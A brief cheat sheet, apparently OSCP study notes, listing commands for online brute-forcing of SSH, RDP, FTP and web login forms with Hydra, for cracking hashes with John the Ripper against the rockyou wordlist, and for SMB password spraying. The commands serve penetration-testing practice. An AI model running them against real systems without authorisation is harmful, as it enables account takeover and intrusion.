# Simple commands:

## Unzipping Rockyou.txt
```
sudo gzip -d /usr/share/wordlist/rockyou.txt.gz
```
## Hydra

```
hydra -l user -p password ssh://$target
```
```
hydra -l user -p password -s <port like 2222> ssh://$target
```
```
hydra -L userlist.txt -P passwordlist.txt -s <port like 2222> ssh://$target
```
Any port really works in this case. 

RDP:
```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt rdp://$target
```

FTP:
```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://$target
```
HTTP:
```
hydra -l user -P /usr/share/wordlists/rockyou.txt $target http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
```
hydra -L /usr/share/wordlists/userlist.txt -P /usr/share/wordlists/rockyou.txt $target http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"
```

## Using John 

```
hashid hash.txt
```

John is simple:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
## Password Spraying
```
crackmapexec smb $target --users
```
```
nxc smb $target -u users.txt -p Password123
```

I go over it in detail here:

https://medium.com/@aaronashley466/oscp-notes-cracking-passwords-and-stabilizing-shells-python-quick-on-the-fly-fixes-cheatsheet-bc7c556ba811

